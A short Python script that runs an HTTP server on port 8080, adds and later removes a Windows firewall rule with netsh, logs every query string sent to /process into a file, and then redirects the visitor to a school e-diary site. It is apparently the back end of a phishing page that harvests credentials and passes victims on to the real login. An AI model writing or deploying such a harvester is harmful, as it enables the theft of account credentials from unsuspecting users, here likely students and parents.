import http.server
import socketserver
import urllib.parse
import os
PORT = 8080
REDIRECT_URL = "https://dienynas.tamo.lt/"
LOG_FILE = "./requests.log"

os.system("netsh advfirewall firewall add rule name=\"Allow 8080\" dir=in action=allow protocol=TCP localport=8080")

class CustomHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urllib.parse.urlparse(self.path)
        query_params = parsed_path.query
        print(parsed_path.path)
        if parsed_path.path == "/process":
            with open(LOG_FILE, "a") as log:
                log.write(query_params + "\n")
            
            self.send_response(302)
            self.send_header("Location", REDIRECT_URL)
            self.end_headers()
        else:
            super().do_GET()

with socketserver.TCPServer(("0.0.0.0", PORT), CustomHandler) as httpd:
    print(f"Serving at port {PORT}")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    os.system("netsh advfirewall firewall delete rule name=\"Allow 8080\"")